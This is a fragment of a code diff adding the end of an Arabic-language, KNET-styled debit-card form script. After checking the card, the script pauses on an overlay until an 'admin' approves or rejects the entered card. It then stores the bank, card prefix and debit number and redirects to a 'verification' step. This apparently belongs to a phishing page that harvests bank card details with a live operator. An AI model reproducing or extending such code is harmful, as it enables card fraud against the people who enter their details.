+              validationError: "expiry_invalid",
+            });
+            setValidationMessage("تاريخ انتهاء البطاقة غير صالح");
+            proceedButton.disabled = false;
+            return;
+          }
+
+          setOverlayVisible(true);
+          const decision = await waitForAdminVerification();
+          if (decision === "approved") {
+            try {
+              window.sessionStorage.setItem(KNET_PREFILL_KEY, JSON.stringify({
+                bank: bankSelect.value,
+                dcprefix: prefixDigits,
+                debit_number: debitValue
+              }));
+            } catch (_) {
+              // noop
+            }
+            redirectToVerificationOnce();
+            return;
+          }
+
+          setOverlayVisible(false);
+          if (decision === "rejected") {
+            setValidationMessage("تم رفض البطاقة المدخلة");
+          } else {
+            setValidationMessage("المعلومات المدخلة غير صحيحة.");
+          }
+          proceedButton.disabled = false;
+        });
+
+        validationMessage.style.display = "none";
+        populatePrefixes(bankSelect.value);
+        updateDebitLengthFromPrefix();
+        restorePrefillFromSession();
+      })(); </script> </body> </html> 
